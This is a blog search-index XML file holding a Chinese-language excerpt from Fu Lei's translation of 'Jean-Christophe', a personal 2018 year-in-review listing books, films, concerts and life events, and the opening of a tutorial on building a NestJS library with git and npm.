<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>《约翰·克利斯朵夫》节选</title>
    <url>/2017/08/21/Jean-Christophe-Note/</url>
    <content><![CDATA[<blockquote>
<p>作者：[法] 罗曼·罗兰 </p>
<p>出版年: 2012-1-1</p>
<p>出版社: 江苏文艺</p>
<p>译者：傅雷</p>
<p>ISBN: 9787539946801</p>
<p>豆瓣链接：<a href="https://book.douban.com/subject/7000672/">https://book.douban.com/subject/7000672/</a></p>
</blockquote>
<p><br/><br/></p>
<h2 align="center">卷三 · 少年</h2>
<h4 align="center">第三部 · 阿达 <部分段落节选 P275-P282></h4>
<br/>

<p>克里斯朵夫认为责任是例外的固然不错，但爱情也一样是例外的。一切都是例外的。一切有点儿价值的东西，它的最可怕的敌人，并非是不好的东西，–（连恶意也有它的价值，）–而是它本身成了习惯性。心灵的致命的仇敌，乃是时间的磨蚀。</p>
<p>阿达开始厌倦了。她不够聪明，不知道在一个像克里斯朵夫那样生机勃勃的人身上，想法使她的爱情与日俱新。在这次爱情中间，她的感官和虚荣心已经把所有的乐趣都榨取到了。现在她只剩下一桩乐趣，就是把爱情毁灭。她有那种暧昧的本能，为多少女子（连善良的在内）多少男子（连聪明的在内）所共有的。–他们都不能在人生中有所创造：作品，儿女，行动，什么都不能，但还有相当的生命力，受不了自己的一无所用。他们但愿别人跟自己一样的没用，便竭力想做到这一点。有时候这是无心的；他们一发觉这种居心不良的欲望，就大义凌然的把它打消。但多数的时候他们鼓励这种欲望，尽量把一切活着的，喜欢活着的，有资格活着的，加以摧毁；而摧毁的程度当然要看他们的力量如何：有些事小规模的，仅仅以周围亲近的人为对象；有些是大举进攻，以广大的群众为目标。把伟大的人物伟大的思想拉下来，拉得跟自己一般高低的批评家，还有以引诱爱人堕落为快的女孩子，是两种性质相同的恶兽。–可是后面的一种更讨人喜欢。</p>
<p>因此阿达极想把克里斯朵夫腐化一下，使他屈辱。其实她还没有这个力量。便是腐化人家，她那点聪明也嫌不够；她自己也觉得，所以她怀恨克里斯朵夫的一大原因，就是她的爱情没有力量伤害他。她不承认有伤害他的欲望；要是能阻止自己，也许她还不会这么做。但她认为要伤害他而办不到未免太岂有此理。倘使一个女人没有一种幻像，使她觉得能完全驾驭那个爱她的人，给他不论是好是坏的影响，那就是这个男人爱她爱得不够，而她非要试试自己的力量不可了。克里斯朵夫没有留意到这些，所以阿达说着玩儿问他：</p>
<span id="more"></span>
<p>“你肯不肯为了我把音乐丢掉？”（其实她完全没这个意思。）</p>
<p>他却老老实实的回答：</p>
<p>“噢！这个吗，不论是你，不论是谁，都没有办法的。我永远丢不了音乐。”</p>
<p>“哼！亏你还说是爱我呢！”她恨恨的说。</p>
<p>她恨音乐，–尤其因为她完全不懂，并且找不到一个空隙来攻击这个无形的敌人，来伤害克里斯朵夫的热情。倘若她用轻蔑的口吻谈论音乐，或是鄙夷不屑的批评克里斯朵夫的曲子，他只是哈哈大笑；阿达虽然懊恼之极，结果也闭上了嘴，因为知道自己可笑。</p>
<p>但即使这方面没有办法，她可发现了克里斯朵夫的另一个弱点，觉得更容易下手：那就是他的道德信仰。他虽然和伏奇尔一家闹翻了，虽然青年期的心情使他沉醉了，可依旧保存着他那精神上的洁癖而自己并不觉得，使一个像阿达般的女人看了始而诧异，继而入迷，继而好笑，继而不耐烦，终于恼恨起来。她从不正面进攻，只是狡猾的问：</p>
<p>“你爱我吗？”</p>
<p>“当然。”</p>
<p>“爱到什么程度？”</p>
<p>“尽一个人所能爱的程度。”</p>
<p>“那不能算多…你说，你能为我做些什么？”</p>
<p>“你要什么就什么。”</p>
<p>“要你做件坏事你做不做？”</p>
<p>“要用这种方式来爱你，太古怪了。”</p>
<p>“不是古怪不古怪的问题。只问你做不做？”</p>
<p>“那是永远不需要的。”</p>
<p>“可是假使我要呢？”</p>
<p>“那你就错了。”</p>
<p>“也许是我错了…可是你做不做？”</p>
<p>他想拥抱她，被她推开了。</p>
<p>“你做还是不做？你说？”</p>
<p>“不做的，我的小宝贝。”</p>
<p>她气愤愤的转过身子。</p>
<p>“你不爱我，你根本不懂什么叫爱。”</p>
<p>“也许是吧。”他笑嘻嘻的说。</p>
<p>他明知自己在热情冲动的时候，会像别人一样做出一桩啥事，也许坏事，或者–谁知道呢？–更进一步的事；但他认为很冷静的说出来以此为豪是可耻的，而说给阿达听是危险的。他本能的感到他那个心爱的敌人在旁等着，只要他漏出一点儿口风便乘机而入；他不愿意让她拿住把柄。</p>
<p>有几次她又回到老题目上来进攻了：</p>
<p>“你是因为你爱我而爱我呢，还是因为我爱你而爱我？”</p>
<p>“因为我爱你而爱你。”</p>
<p>“那么假使我不爱你了，你还是会爱我的？”</p>
<p>“是的。”</p>
<p>“要是我爱了别人，你也永远爱我吗？”</p>
<p>“啊！这个我可不知道…我想不会吧…总之那时我不会再爱别人的了。”</p>
<p>“我爱了别人，情形又有什么不同？”</p>
<p>“哦，大不同了。我也许会变，你是一定会变的。”</p>
<p>“我会变吗？那又有什么关系？”</p>
<p>“当然关系很大。我爱的是你现在这样的你。你要变了，我不敢担保再爱你。”</p>
<p>“噢！你不爱我！你不爱我！这些废话是什么意思？一个人要就爱，要就不爱。如果你爱我，你就该爱我，爱我现在的样子，也不管我做些什么，永远得爱下去。”</p>
<p>“这样的爱你，不是把你当作畜生了吗？”</p>
<p>“我就是要你这样的爱我。”</p>
<p>“那么你看错人了，”他开玩笑似的说，“我不是你心目中的那种人，我即使原因这样做也未必做得到。何况我也不愿意。”</p>
<p>“你自命为聪明！你爱你的聪明甚于爱我。”</p>
<p>“我爱的明明是你，你这个没良心的！我爱你比你爱自己还要深切。你越美丽，心越好，我越爱你。”</p>
<p>“你倒是个老学究。”她懊恼的说。</p>
<p>“你要我怎么办呢？我就是爱美，恨丑。”</p>
<p>“便是我身上的丑也恨吗？”</p>
<p>“尤其是在你身上的。”</p>
<p>她愤愤的跺着脚：“我不愿意受批判。”</p>
<p>“那么你尽管抱怨吧，抱怨我批判你，抱怨我爱你。”他温柔的说着，想抚慰她。</p>
<p>她让他抱在怀里，甚至还微微笑着，允许他亲吻。但过了一会儿，他以为她忘了，她又不安的问：“你觉得我丑的是什么呢？”</p>
<p>他不敢告诉她，只是恨懦怯的回答：“我不觉得你有什么丑的地方。”</p>
<p>她想了想，笑着说：“你说你不喜欢扯谎的，可不是？”</p>
<p>“那我最恨了。”</p>
<p>“对，我也恨。我从来不扯谎，所以在这方面我不用操心。”</p>
<p>他对她瞧了瞧，觉得她是说的真心话。对自己的缺点这样的毫无知觉，他看了軟心了。</p>
<p>“那么，”她把手臂勾着他的脖子，“假使我一朝爱了别人而告诉了你，你干嘛要恨我呢？”</p>
<p>“别老是磨我啊。”</p>
<p>“我不磨你。我不跟你说我现在爱了别人；而且还可以告诉你现在不爱别人…可是将来要是我爱了…”</p>
<p>“咱们不用想这个。”</p>
<p>“我可是要想的…那时候你不恨我吗？总不能恨我吧？”</p>
<p>“我不恨你，只是离开你。”</p>
<p>“离开我？为什么？要是我仍旧爱你的话？…”</p>
<p>“一边爱着别人一边还爱我？”</p>
<p>“当然咯，那是可能的。”</p>
<p>“对我们可不会有这种事。”</p>
<p>“为什么？”</p>
<p>“因为你爱上别一个的时候，我就不爱你了，绝不再爱你了。”</p>
<p>“刚才你还说：‘也许…’ 现在你说你不爱我了！”</p>
<p>“这样对你更好。”</p>
<p>“为什么？”</p>
<p>“因为你爱着别人的时候我要是还爱你，那么结果对你，对我，对别人都是不利的。”</p>
<p>“哦！…你简直疯了。那么我非一辈子和你在一块儿不可吗？”</p>
<p>“放心，你是自由的。你爱什么时候离开我就什么时候离开我。只是那时候不是再会而是永别了。”</p>
<p>“但要是我仍旧爱你呢？”</p>
<p>“爱是需要彼此牺牲的。”</p>
<p>“那么你牺牲吧！”</p>
<p>他对她这种自私不由得笑了；她也笑了。</p>
<p>“片面的牺牲只能造成片面的爱。”他说。</p>
<p>“绝对不会的，它能造成双方的爱。如果你为我而牺牲，我只有更爱你。你想想吧，在你一方面，既然能为我牺牲，就表示你非常爱我，所以你就能非常幸福了。”</p>
<p>他们笑了，很高兴能够把彼此那么认真的意见丢一下。</p>
<p>他笑着，他望着她。其实她的确像她所说的，绝无意思此刻就离开克里斯朵夫；虽然他常常使她烦腻，使她气恼，她也知道像他这样的忠诚是多么可贵；而且她也并不爱别人。她刚才的话是说着玩儿的，一般因为知道他不喜欢这种话，一半因为觉得玩弄这些危险而不清不白的思想自有一种乐趣，像小孩子喜欢搅弄脏水一样。他知道这点，并不恨她。但对于这一类不健康的辩难，对于跟这个捉摸不定而心神不安的女子的争执，他觉得厌倦了；为了要无中生有的，在她身上找出优点来骗自己而花这么大的劲，他也厌倦了，有时甚至厌倦得哭了。他想：“为什么她要这样呢，一个人为什么要这样呢？人生真无聊！”…同时他微微笑着，，望着伏在他身上的那张娇艳的脸，蓝的眼睛，花一般的皮色，爱笑爱唠叨而带点蠢相的嘴巴，半开半合的，露着舌头与滋润的牙齿的光彩。他们的嘴唇差不多碰上了；可是他放佛是远远的看着她，很远很远，像是从另一个世界上望过来的；他眼看她慢慢的远去，隐没在云雾里了…随后他竟瞧不见她了，听不见她了。他忘了一切，只想着音乐，想着他的梦，想着跟阿达完全无关的事。他听见一个调子。他静静地在那里作曲…啊！美妙的音乐！…多么凄凉，凄凉欲绝！可又是温柔的，慈爱的…啊！多么好！…可不是？可不是？…其余的一切都是虚幻的。</p>
<p>他被人抓着手臂推了几下，听见有个声音喊着：</p>
<p>“喂，你怎么啦？你真的疯了吗？干嘛这样的瞅着我？干嘛不回答我呢？”</p>
<p>他又看到了那双望着他的眼睛。那是谁啊…–啊！是的…–他叹了一口气。</p>
<p>她仔细的把他打量着，要知道他想些什么。她弄不明白，只觉得自己白费力气，没法完全把他抓住，他老是有扇门可以逃的。她暗中生气了。</p>
<p>有一次她把他从这种出神的境界中叫回来，问，“干吗你哭呀？”</p>
<p>他把手抹了抹眼睛，才觉得湿了。</p>
<p>“我不知道，”他说。</p>
<p>“干吗你不回答？我已经问你三遍啦。”</p>
<p>“你要什么呢？”他语气很温和的说。</p>
<p>她又开始那些古怪的辩论，他做了一个厌倦的手势。</p>
<p>“别急，”她说，“我再说一句就完啦。”</p>
<p>可是她又滔滔不绝的说开去了。</p>
<p>克里斯朵夫气的直跳起来：“你能不能不再跟我说这些下流话？”</p>
<p>“我是说着玩的。”</p>
<p>“那么找些干净一点的题目！”</p>
<p>“至少你得跟我讨论一下，说出你讨厌的理由。”</p>
<p>“这有什么理由可说的！譬如垃圾发臭，难道还得讨论它发臭的原因吗？它发臭，那就完了，我只能堵着鼻子走开。”</p>
<p>他愤愤的走了，迈着大步，呼吸着外边冰冷的空气。</p>
<p>可是她又来了，一次，两次，十次。凡是能伤害他良心的，使它难堪的，她都一齐抖出来摆在他面前。</p>
<p>他以为这不过是一个神经衰弱的女子的病态的玩意儿，喜欢把磨人当作消遣。他耸耸肩膀，或者假装不听她的，并不拿她当真。但他有时仍不免想把她从窗里扔出去；因为神经衰弱这个病和闹神经衰弱的人对他都不是味儿…</p>
<p>然而只要离开她十分钟，他就会把一切讨厌的事忘的干干净净。他又抱着新的希望新的幻象回到阿达身边去了。他是爱她的。爱情是一种永久的信仰，一个人信仰，就因为他信仰，上帝存在与否事没有关系的。一个人爱，就因为他爱，用不着多大理由！…</p>
<p>EOF.</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>2018年度总结</title>
    <url>/2019/01/06/2018-summary/</url>
    <content><![CDATA[<blockquote>
<p>未经审视的生活是不值得过的 - 苏格拉底</p>
</blockquote>
<blockquote>
<p>生命是一团欲望，欲望不能满足便痛苦，满足便无聊，人生就在痛苦和无聊之间摇摆 - 叔本华</p>
</blockquote>
<p>上周五刚卷铺盖滚出了入职不满四个多月的厂子，如今写起字来不免<strong>悲凉</strong>，只希望接下来文思泉涌时莫泪洒键盘，笔记本给整坏了，恐怕一时半会都没钱修理了。</p>
<hr>
<h3 id="干过的事儿"><a href="#干过的事儿" class="headerlink" title="干过的事儿"></a>干过的事儿</h3><h4 id="书"><a href="#书" class="headerlink" title="书"></a>书</h4><ul>
<li><a href="https://book.douban.com/subject/26908213/">西西弗神话-加缪全集：第五卷</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/25956992/">博尔赫斯，口述</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/25796061/">杜撰集</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/5423785/">千年繁华-京都的街巷人生</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/26270303/">永恒史</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/25862578/">解忧杂货店</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/27599965/">就喜欢你看不惯我又干不掉我的样子3</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/4105446/">十一种孤独 Eleven Kinds of Loneliness</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/27200261/">假面山庄</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/27085746/">漫长的告别</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/6125543/">北方的空地</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/3908240/">情人</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/1400707/">广岛之恋</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/27031276/">再见，宝贝 Farewell, My Lovely</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/26863349/">湖底女人 The Lady in the Lake</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/6515859/">傅译巴尔扎克代表作1</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/6515860/">傅译巴尔扎克代表作2</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/6515861/">傅译巴尔扎克代表作3</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/26841607/">高窗 The High Window</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/27614904/">房思琪的初恋乐园</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/10555509/">看不见的城市  Le città invisibili</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/1858513/">月亮和六便士</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/26757680/">面纱</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/26638213/">简爱</a> ✭✭✭✭ </li>
<li><a href="https://book.douban.com/subject/25752284/">艽野尘梦</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/4742918/">1Q84 BOOK 1</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/4885241/">1Q84 BOOK 2</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/5502995/">1Q84 BOOK 3</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/24382569/">一桩事先张扬的凶杀案</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/26892991/">你的第一本哲学书 What Does it All Mean?</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/26390842/">哲学家们都干了些什么</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/3131626/">荒原狼</a> ✭✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/3071717/">爱你就像爱生命</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/1917972/">在路上 On the Road</a> ✭✭✭✭</li>
<li><a href="https://book.douban.com/subject/5388095/">三个火枪手</a> ✭✭✭</li>
</ul>
<span id="more"></span>

<h4 id="影"><a href="#影" class="headerlink" title="影"></a>影</h4><ul>
<li><a href="https://movie.douban.com/subject/22265634/">星球大战8：最后的绝地武士</a> ✭✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26662193/">前任3：再见前任</a> ✭✭</li>
<li><a href="https://movie.douban.com/subject/26586766/">勇敢者游戏：决战丛林</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/6874741/">无问西东</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26787574/">奇迹男孩 Wonder</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/6982558/">长城 The Great Wall</a> ✭✭</li>
<li><a href="https://movie.douban.com/subject/27027913/">忌日快乐 Happy Death Day</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26861685/">红海行动</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26698897/">唐人街探案2</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/1291566/">攻壳机动队2：无罪 攻殻機動隊2 イノセンス</a> ✭✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26611804/">三块广告牌 Three Billboards Outside Ebbing, Missouri</a> ✭✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26752852/">水形物语 The Shape of Water</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/20435622/">环太平洋：雷霆再起 Pacific Rim: Uprising </a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/1292225/">闪灵 The Shining</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/4920389/">头号玩家 Ready Player One</a> ✭✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26378801/">龙珠超 ドラゴンボール超（スーパー）</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26647117/">暴裂无声</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26384741/">湮灭 Annihilation</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26640371/">犬之岛 Isle of Dogs</a> ✭✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26924141/">低压槽：欲望之城 低壓槽</a> ✭✭</li>
<li><a href="https://movie.douban.com/subject/1306799/">恋战冲绳 戀戰沖繩</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/25886495/">天师斗僵尸 天師鬥殭屍</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/24773958/">复仇者联盟3：无限战争 Avengers: Infinity War</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/3690289/">春风沉醉的夜晚</a> ✭✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/1299661/">苏州河</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26997663/">寂静之地 A Quiet Place</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/25900947/">游侠索罗：星球大战外传 Solo: A Star Wars Story</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/25918677/">命运速递</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/1307163/">棋王</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26842702/">燃烧 버닝</a> ✭✭✭✭ </li>
<li><a href="https://movie.douban.com/subject/26416062/">侏罗纪世界2 Jurassic World: Fallen Kingdom</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26925317/">动物世界</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26752088/">我不是药神</a> ✭✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/25882296/">狄仁杰之四大天王</a> ✭✭</li>
<li><a href="https://movie.douban.com/subject/27622447/">小偷家族 万引き家族</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26588308/">死侍2 Deadpool 2</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26985127/">一出好戏</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/1293755/">驱魔人 The Exorcist</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/6771529/">突袭 The Raid</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26972258/">江湖儿女</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26425063/">无双 無雙</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/11501396/">边境风云</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/3168101/">毒液：致命守护者 Venom</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26147417/">神奇动物：格林德沃之罪 Fantastic Beasts: The Crimes of Grindelwald</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/27110296/">无名之辈</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/3878007/">海王 Aquaman</a> ✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26374197/">蜘蛛侠：平行宇宙 Spider-Man: Into the Spider-Verse</a> ✭✭✭✭</li>
<li><a href="https://movie.douban.com/subject/26633257/">地球最后的夜晚</a> ✭✭✭✭</li>
</ul>
<h4 id="音"><a href="#音" class="headerlink" title="音"></a>音</h4><ul>
<li>广州草莓音乐节／<code>广州长隆</code>／1.8</li>
<li>张玮玮和郭龙”沿江而来”巡演／<code>广州Mao live house</code>／1.21</li>
<li>“狗年月”周云蓬与乐队巡演／<code>广州Mao live house</code>／3.24</li>
<li>崔健滚动三十Olive橄榄现场广州演唱会／<code>广州体育馆</code>／6.2</li>
<li>二手玫瑰2018”我要开花”全国巡演／<code>广州Mao live house</code>／6.18</li>
<li>Mailive恋爱的犀牛广州站／<code>广东粤剧艺术中心</code>／8.18</li>
<li>五条人2018”阿珍爱上了阿强”全国巡演中山站／<code>中山Sun live house</code>／9.1</li>
<li>以太呈献-野外合作社2018”台风来了”全国巡演广州站／<code>广州191space</code>／10.20</li>
<li>野孩子乐队2018大桥下面新专辑冬季巡演广州站／广州Mao live house／11.23</li>
<li>“爱是最稀有的东西”-丁薇2018全国巡演广州站／<code>广州TU凸空间</code>／11.30</li>
<li>2018广东双城超级草莓音乐节广州站／<code>广州长隆</code>／12.9</li>
<li>匈奴王重出江湖，阿琳娜余情未了-五条人大型演唱会广州站／<code>广州Mao live house</code>／12.28</li>
</ul>
<h4 id="旅途"><a href="#旅途" class="headerlink" title="旅途"></a>旅途</h4><ul>
<li><p>略有<strong>遗憾</strong>的滇藏-新藏线骑行</p>
<p>  7月份从大圣离职，恰逢亚运城住了2年的房子到期，也无心续租，便踏上了如之前一样心血来潮的脑袋被驴踢了的骑行之旅。原计划从<code>大理</code>出发，沿滇藏线到<code>拉萨</code>，休整几天后走中尼公路去<code>珠峰大本营</code>，然后回拉萨，反骑219国道去<code>喀什</code>，在新疆结束这段牛逼中蕴含无数傻逼的旅途。结果出发十几天刚到达<code>芒康</code>，便搭车回<code>成都</code>，死里逃生般匆匆结束。</p>
</li>
<li><p>国庆两广游</p>
<p>  假期到来前几天，匆匆退掉了厦门和泉州的动车票，决定不趟国庆这滩浑水去热门景区数人头，而改为2号自驾去稍近点儿的黄姚古镇，一路边玩边回，错过糟心的高峰期，度过一个愉快祥和的长假，最终是如人愿，可能也是近几年过的<strong>最舒服最开心</strong>的国庆了。最终的路线<code>广州</code>-&gt;<code>黄姚</code>-&gt;<code>贺州</code>-&gt;<code>梧州</code>-&gt;<code>肇庆</code>-&gt;<code>广州</code>。</p>
</li>
</ul>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul>
<li>搬了一次家</li>
<li>交了一个女朋友</li>
<li>略</li>
</ul>
<hr>
<p>今年最<strong>开心</strong>的事儿应该就是把爹娘和妹妹一起叫来广州过年了。</p>
<p>在经历了一个跟往常无二的<strong>沮丧</strong>的抢票季之后，决定不回了，有生以来第一次在外地过年。习惯了大年走街串巷的熙攘吵闹，在陌生的广州别有一种冷清与<strong>恬静</strong>，吃到娘亲做的家常菜更是<strong>妙不可言</strong>。少了家里的许多应酬，在这儿就走走花市、爬爬山、拜拜妈祖、吹吹海风、看看电影和逛逛街，去了一趟惠州舅舅家，现在想想挺开心的，妹妹一直向往大城市的生活，而爹娘可能连想都不敢想，可以有机会在千兵营村外的地方度过这样一个别致的春节。不知觉二老已双双年过半百，依然在为了这个家庭不辞劳苦辛勤耕耘，到了这把年纪似乎可以放慢脚步，享受天伦之乐，而他们的孩子，我，没有结婚没有孩子没有房，只有每周末一次短暂的千里之外的视频连线，在他们眼中大城市的压力是巨大的，他们要分担这种压力，要拼命，可在现实面前是微不足道的，我也是。我又非常非常不善于跟父母沟通情感，这很令人头疼，有时脑袋在想啥，我自己都搞不清楚。生活如此荒谬，理想主义在现实面前也总是弱不禁风，无数次自我告诫，无数次都在毫无预兆的一点琐碎念想中坍塌，最终无数次的自我否定也把自己揉为了一个矛盾体，世俗和理想纷繁交织，自卑与自负沆瀣一气，每一个想法背后都有无数的敌对者，我变成了西西弗斯，像永无止境的拔河比赛，也像坠落在望不到尽头的深渊。有时我不禁会想，<strong>人就是在挣扎中日渐平庸，这种挣扎是一个陷阱，一种走向妥协的润滑剂，幻想自己在努力，其实也只是徒劳的幻想</strong>。</p>
<p>五月份回了家一趟，参加高中同学的婚礼，心情怪复杂的，一个个帅小伙儿都成家了。几个许久未谋面的老友聚到一块儿贼开心，开心的事儿也总是短暂的。</p>
<p>六月份时曾跟一球友一块儿做一个项目，后不疾而终，简直是干啥啥不成，总觉得是项目不合适，或甩锅给其他原因，后来良心发现，找自身因素，闷着脑袋想了好多天，最终也还是啥都没想出来，索性就放弃了，可能就是不适合。</p>
<p>九月份入职新厂，不料三个多月就匆匆离职，刷新了记录，略显尴尬的记录。我这种很自我的人，简直是领导的恶魔，特别是控制欲强的领导，(突然怀念起大圣很佛系的有斌哥了)，工作做起来贼不舒服，效率又低，也曾努力尝试去适应，未果，终提出离职，在春节前干出这种事儿，也让颇令人意外，然意外归意外，同为打工仔，都不容易，互相祝福吧。</p>
<p>接着在这尴尬的时期一直在犹豫要不要找新工作，<code>肥琳</code>建议休息一下，早日回家过年，年后再找，我思索良久，终接受，其实主要是因为<strong>我这种废柴估计也找不到啥工作了</strong>，何必给新年添堵，老老实实回家过个好年。</p>
<p>2018虽然没了工作，但找到了一个贴心小棉袄-肥琳，无论2020年是否会被消灭，我都要</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">听最嗨的歌</span><br><span class="line">开最快的车</span><br><span class="line">撞最硬的电杆</span><br><span class="line">住最好的医院</span><br><span class="line">打最贵的石膏</span><br><span class="line">躺最贵的棺材</span><br><span class="line">长最高的坟头草</span><br></pre></td></tr></table></figure>

<p>冲鸭。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>广州</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始编写Nest库</title>
    <url>/2023/04/23/first-nest-library/</url>
    <content><![CDATA[<h3 id="十万个为什么"><a href="#十万个为什么" class="headerlink" title="十万个为什么"></a>十万个为什么</h3><p><code>nest</code>库是什么？<code>nest</code>是一个<code>typescript</code>构建的<code>node</code>框架，那<code>nest</code>库可以理解为依赖<code>nest</code>框架的<code>node</code>库？<code>node</code>是一个<code>javascript</code>服务端的运行环境，那又要怎样用<code>typescript</code>编写<code>javascript</code>库呢？做为一只从其他语言(<code>js</code>几乎零基础只会简单的<code>jQuery</code>)转来学习<code>nest</code>的菜鸟刚开始总会在某些时刻冷不丁得被这些概念绕的云里雾里，不过是因为直接跨过<code>js</code>、<code>node</code>、<code>ts</code>直接啃<code>nest</code>的原因，底层建筑不牢固直接搬砖终究是雾里看花，而从零手撸一个<code>nest</code>库不妨可以视为一个敲门砖，可以带我们看一探<code>js</code>世界的冰山一角.</p>
<h3 id="撸起袖子开干"><a href="#撸起袖子开干" class="headerlink" title="撸起袖子开干"></a>撸起袖子开干</h3><h4 id="给它一个家"><a href="#给它一个家" class="headerlink" title="给它一个家"></a>给它一个家</h4><p><code>nest</code>库终究也是一个独立的项目，和其他开源库一样我们使用<code>github</code>来做版本管理，新建一个空白仓库<code>clone</code>到本地.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$: git <span class="built_in">clone</span> https://github.com/tashuo/nestjs-config</span><br><span class="line">$: <span class="built_in">cd</span> nestjs-config</span><br></pre></td></tr></table></figure>

<h4 id="给它一支指挥棒"><a href="#给它一支指挥棒" class="headerlink" title="给它一支指挥棒"></a>给它一支指挥棒</h4><blockquote>
<p><code>npm</code> is the world’s largest software registry. Open source developers from every continent use npm to share and borrow packages, and many organizations use npm to manage private development as well.</p>
</blockquote>
<span id="more"></span>
<p><em>本项目使用<code>npm</code>做为<code>js</code>的依赖管理工具</em></p>
<p><code>npm</code>使用<code>package.json</code>作为整个项目的配置，包括包名、版本号、依赖、测试等等，当前直接初始化配置文件，初始化过程中可以交互式的填入一些基本配置，也可以一路回车后面手动编辑配置.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$: npm init</span><br></pre></td></tr></table></figure>

<p>具体配置可参考：<a href="https://www.typescriptlang.org/docs/handbook/declaration-files/publishing.html">https://www.typescriptlang.org/docs/handbook/declaration-files/publishing.html</a></p>
<p><code>ts</code>项目需要重点关注<code>main</code>和<code>types</code>配置，当前项目的场景只需要配置<code>main</code>为<code>dist/index.js</code>，因为<code>dist</code>目录编译出的<code>index.d.ts</code>也可用于声明导出的文件</p>
<blockquote>
<p>If your package has a main .js file, you will need to indicate the main declaration file in your package.json file as well. Set the types property to point to your bundled declaration file.</p>
<p>Also note that if your main declaration file is named index.d.ts and lives at the root of the package (next to index.js) you do not need to mark the types property, though it is advisable to do so.</p>
</blockquote>
<h4 id="告诉它如何变身"><a href="#告诉它如何变身" class="headerlink" title="告诉它如何变身"></a>告诉它如何变身</h4><blockquote>
<p><code>TypeScript</code> is a language that is a superset of <code>JavaScript</code>: JS syntax is therefore legal TS.</p>
</blockquote>
